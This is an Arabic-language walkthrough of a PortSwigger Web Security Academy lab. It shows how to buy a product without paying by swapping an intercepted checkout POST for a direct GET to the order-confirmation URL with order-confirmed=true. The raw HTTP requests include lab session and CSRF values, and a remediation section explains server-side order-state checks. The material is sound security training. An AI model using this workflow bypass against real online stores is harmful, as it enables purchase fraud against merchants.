# [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)

## **`الهدف`**
استغلال ثغرة لشراء منتج معين `(Lightweight l33t leather jacket)`.
## **`خطوات الحل`**
نقوم بتسجيل الدخول إلى حساب `wiener:peter` ونقوم بإضافة أى منتج إلى سلة المشتريات، وبعدها نذهب إلى السلة ونقوم بالضغط على `Place order` ونعترض الطلب باستخدام `Burp Suite`

```http
POST /cart/checkout HTTP/2
Host: 0a4b005803d09f4b83eeb974009100f3.web-security-academy.net
Cookie: session=9g6T8HGIrzttVxyC64xJJP8h6jTKeZwa

csrf=LURi66SQJoqddxGDkjIcwM8pTIK7iIT1
```

ونقوم بتعديل `POST /cart/checkout HTTP/2` إلى `GET /cart/order-confirmation?order-confirmed=true HTTP/2` 

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a4b005803d09f4b83eeb974009100f3.web-security-academy.net
Cookie: session=9g6T8HGIrzttVxyC64xJJP8h6jTKeZwa

csrf=LURi66SQJoqddxGDkjIcwM8pTIK7iIT1
```

لنتخطى خطوة التأكد من وجود سعر كافي في الحساب لشراء هذه المنتج ونصل مباشرة إلى خطوة تأكيد الطلب ونحصل على المنتج بدون دفع أي مُقابل مادي، لننتهي بذلك من حل اللاب.
## **`ترقيع الثغرة`**
يجب على النظام ألا يسمح بالوصول إلى صفحة تأكيد الطلب `(/cart/order-confirmation)` بشكل مباشر أو عشوائي، بحيث يتم التحقق من أن حالة الطلب الحالية في قاعدة البيانات قد تجاوزت مرحلة "الدفع الناجح" بنجاح قبل عرض صفحة التأكيد.
ويجب على السيرفر عدم الاعتماد على المُعاملات التي يُرسلها المُستخدم في الرابط مثل `(order-confirmed=true)` لتحديد حالة الطلب، بدلًا من ذلك، يجب على السيرفر التحقق من أن الطلب المُرتبط بجلسة `session` المُستخدم الحالية قد مر بجميع الخطوات السابقة المُعتمدة في النظام وذلك بناءً على البيانات المسجلة في قاعدة البيانات، وليس بناءً على طلب القادم من المتصفح.

وبما أن عملية تأكيد الطلب وتغيير حالة المخزون أو الحساب هي عملية تعديل بيانات `(State-changing operation)`، فيجب أن تتم عملية تأكيد الطلب وتغيير حالة السلة أو الحساب حصرًا عبر طلبات من نوع `POST` أو `PUT` محمية بـ `CSRF Token` يتم توليدها باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المُهاجم، مع رفض أي طلبات من نوع `GET` تحاول إتمام الطلب أو تجاوزه.
